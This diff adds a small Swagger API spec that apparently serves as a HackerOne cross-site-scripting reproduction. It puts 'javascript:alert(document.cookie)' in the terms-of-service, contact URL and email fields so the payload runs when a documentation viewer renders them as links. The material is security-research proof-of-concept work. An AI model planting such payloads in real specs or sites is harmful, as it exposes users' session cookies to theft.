@@ -1,0 +1,10 @@
+swagger: "2.0",
+info: 
+  title: "HackerOne Test Research App",
+  description: "To repro, select the link.",
+  termsOfService: "javascript:alert(document.cookie)"
+  contact: 
+    name: "Test Contact",
+    url: "javascript:alert(document.cookie)",
+    email: "javascript:alert(document.cookie)"
+  version: "1.0.1"
